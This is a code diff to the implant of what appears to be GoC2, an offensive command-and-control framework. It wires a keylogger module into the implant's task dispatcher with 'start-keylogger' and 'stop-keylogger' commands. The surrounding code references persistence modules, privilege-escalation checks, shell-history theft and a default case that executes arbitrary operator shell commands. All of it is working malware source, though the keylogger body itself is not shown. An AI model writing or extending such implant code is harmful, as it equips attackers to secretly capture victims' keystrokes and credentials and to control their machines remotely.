@@ -51,6 +51,7 @@ import (
 	"github.com/latortuga71/GoC2/internal/modules/persistence/powershellprofile"
 	"github.com/latortuga71/GoC2/internal/modules/persistence/runkey"
 	"github.com/latortuga71/GoC2/internal/modules/privilegeescalation/goup"
+	"github.com/latortuga71/GoC2/internal/modules/privilegeescalation/keylogger"
 	"github.com/latortuga71/GoC2/internal/modules/privilegeescalation/shellhistory"
 	"github.com/latortuga71/GoC2/internal/utils"
 )
@@ -262,6 +263,11 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = shellhistory.GetShellHistory()
 	case "go-up":
 		result, cmdError = goup.AllChecks()
+	case "start-keylogger":
+		go keylogger.StartKeyLogger()
+		result, cmdError = "[+] Started keylogger service", nil
+	case "stop-keylogger":
+		result, cmdError = keylogger.StopKeyLogger()
 	default:
 		result, cmdError = basic.ShellCommand(t.Args)
 	}
